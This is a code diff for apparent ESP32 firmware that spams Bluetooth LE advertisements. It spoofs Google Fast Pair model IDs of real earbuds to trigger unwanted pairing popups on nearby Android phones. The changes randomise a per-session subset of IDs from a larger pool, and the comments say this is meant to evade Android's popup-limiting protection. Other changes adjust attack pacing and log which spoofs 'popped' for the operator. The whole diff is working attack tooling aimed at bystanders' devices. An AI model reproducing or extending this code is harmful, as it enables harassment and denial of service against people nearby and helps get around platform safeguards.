@@ -169,10 +169,32 @@ void BLESpanner::start(const BleSpamConfig& config) {
         }
     }
 
-    // Configure ADV interval - standard intervals for stability
-    m_pAdvertising->setMinInterval(0x20); // 20ms
-    m_pAdvertising->setMaxInterval(0x40); // 40ms
+    // Configure ADV interval - fixed, no longer a function of intensity (ADR-0151). The rotation
+    // period (set in runSpamCycle via rotationPeriodForIntensity) is now the single pacing knob.
+    m_pAdvertising->setMinInterval(BLE_SPAM_ADV_INTERVAL_UNITS_MIN); // 20 ms
+    m_pAdvertising->setMaxInterval(BLE_SPAM_ADV_INTERVAL_UNITS_MAX); // 40 ms
     m_pAdvertising->setScanResponse(true);
+
+    // Draw a fresh Fast Pair subset for this session (ADR-0151). Every start() re-rolls so the ID
+    // set varies across sessions; within a session the rotation walks these 4 only, which keeps
+    // Android's per-advertiser distinct-ID count low enough to dodge cache-bloat limiting. The
+    // ANDROID branch of updatePayload() reads this array via m_lastModelIdx.
+    drawFastPairSubset(BLE_FAST_PAIR_POOL_SIZE, BLE_FAST_PAIR_SUBSET_SIZE,
+                       m_fastPairSubset, []() -> uint32_t { return esp_random(); });
+    m_lastModelIdx = -1; // first updatePayload() increments-then-indexes -> starts at subset[0]
+
+    // Announce the drawn subset at INFO so the operator can diagnose which Model IDs popped (or
+    // didn't) against the serial log without turning on debug verbosity. Each ID is 3 bytes;
+    // the host-side popup, when it fires, shows the matching product name.
+    if (config.provider == BleSpamProvider::ANDROID) {
+        LOG_I("BLE", "Fast Pair subset for this session:");
+        for (size_t i = 0; i < BLE_FAST_PAIR_SUBSET_SIZE; i++) {
+            const GfpsProfile& p = kBleFastPairPool[m_fastPairSubset[i]];
+            LOG_I("BLE", "  [%u/%u] 0x%06X  %s",
+                  (unsigned)(i + 1), (unsigned)BLE_FAST_PAIR_SUBSET_SIZE,
+                  (unsigned)p.id, p.name);
+        }
+    }
 
     // Initial payload
     updatePayload();
@@ -435,8 +457,8 @@ void BLESpanner::spamTask(void* pvParameters) {
 
 void BLESpanner::runSpamCycle() {
     m_packetCount = m_packetCount + 1;
-    uint32_t interval = 1100 - (m_config.intensity * 100);
-    if (interval < 200) interval = 200; // Can go much faster now!
+    // Single pacing formula (ADR-0151): intensity -> rotation period, clamped at both ends.
+    uint32_t interval = rotationPeriodForIntensity(m_config.intensity);
     m_pps = 1000.0f / (float)interval;
 
     // Fast Rotation using Random Address (No deinit needed!)
@@ -492,15 +514,13 @@ void BLESpanner::generateRandomMac() {
 }
 
 void BLESpanner::setIntensity(uint8_t level) {
-    if (!m_pAdvertising) return;
-    
+    // Single pacing model (ADR-0151): intensity sets the rotation period only. The radio adv
+    // interval is a fixed constant set once at start() and must stay that way, so this setter no
+    // longer writes it. runSpamCycle() reads m_config.intensity through rotationPeriodForIntensity
+    // on every cycle, so a level change here takes effect on the next rotation with no plumbing.
+    if (level < 1)  level = 1;
+    if (level > 10) level = 10;
     m_config.intensity = level;
-    // Map intensity 1-10 to intervals 500ms down to 20ms
-    uint32_t interval = 500 - (uint32_t)(level - 1) * 50;
-    if (interval < 20) interval = 20;
-    
-    m_pAdvertising->setMinInterval(interval / 0.625);
-    m_pAdvertising->setMaxInterval(interval / 0.625);
 }
 
 void BLESpanner::setLayout(KeyboardLayout layout) {
@@ -555,32 +575,23 @@ void BLESpanner::notifyAuthResult(bool encrypted) {
 void BLESpanner::updatePayload() {
     if (!m_pAdvertising) return;
 
-    struct GfpsProfile { uint32_t id; const char* name; };
-    // Verified Fast Pair Model IDs - sequential rotation for maximum unique popups
-    static const GfpsProfile profiles[] = {
-        // A larger list of model IDs will
-        // bloat the android cache and trigger a popup limiting
-        // NOTE: Model pool is currently static — Add dynamic 3-4 model selection from a larger list
-        // on attack start if cache bloat becomes an issue.
-        {0x00B26E, "Pixel Buds"},
-        {0x92BBBD, "Sony WF-1000XM4"},
-        {0xF52494, "JBL Live Pro+ TWS"},
-        {0x72EF8D, "Razer Hammerhead TWS X"},
-    };
-    const int numProfiles = sizeof(profiles) / sizeof(profiles[0]);
-    
     std::vector<uint8_t> finalP;
     const char* dName = "Adversary";
 
     if (m_config.provider == BleSpamProvider::ANDROID) {
-        // Sequential rotation - ensures each Model ID gets used before repeating
-        m_lastModelIdx = (m_lastModelIdx + 1) % numProfiles;
-        
-        GfpsProfile active = profiles[m_lastModelIdx];
+        // Rotate sequentially within the session's randomized Fast Pair subset (ADR-0151). The
+        // subset was drawn at start() from kBleFastPairPool; one session advertises few distinct
+        // IDs (dodges Android's cache-bloat limiting) while the set varies across sessions.
+        m_lastModelIdx = (m_lastModelIdx + 1) % (int)BLE_FAST_PAIR_SUBSET_SIZE;
+
+        const GfpsProfile& active = kBleFastPairPool[m_fastPairSubset[m_lastModelIdx]];
         dName = active.name;
-        
-        LOG_D("BLE", "Spoofing [%d/%d]: %s (0x%06X)",
-            m_lastModelIdx + 1, numProfiles, active.name, (unsigned int)active.id);
+
+        // INFO so the operator can match popups to rotations without raising debug verbosity
+        // (the diagnostic log that told us "only 2 of 4 popped on the clean-cache run" would
+        // otherwise be invisible at the default log level).
+        LOG_I("BLE", "Spoofing [%d/%d]: %s (0x%06X)",
+            m_lastModelIdx + 1, (int)BLE_FAST_PAIR_SUBSET_SIZE, active.name, (unsigned int)active.id);
 
         // 1. Flags (3 bytes)
         finalP.push_back(0x02); finalP.push_back(0x01); finalP.push_back(0x06);
